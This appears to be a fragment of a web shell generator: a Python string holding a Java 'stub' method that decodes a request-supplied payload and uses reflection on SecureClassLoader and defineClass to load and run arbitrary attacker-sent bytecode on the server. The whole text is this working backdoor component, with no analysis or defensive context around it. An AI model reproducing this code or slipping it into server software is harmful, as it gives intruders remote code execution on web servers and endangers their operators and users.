code = """
    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (payload == null) {
            return null;
        }
        payload = new String(decoder(payload));
        byte[] b = b64decode(payload);
        Constructor constructor = java.security.SecureClassLoader.class
            .getDeclaredConstructor(ClassLoader.class);
        constructor.setAccessible(true);
        ClassLoader classloader = (ClassLoader) constructor.newInstance(
            new Object[]{this.getClass().getClassLoader()}
        );
        Method defineMethod = ClassLoader.class.getDeclaredMethod(
            "defineClass", byte[].class, int.class, int.class
        );
        defineMethod.setAccessible(true);
        ((Class) defineMethod.invoke(classloader, b, 0, b.length))
            .newInstance().equals(request);
        return null;
    }
"""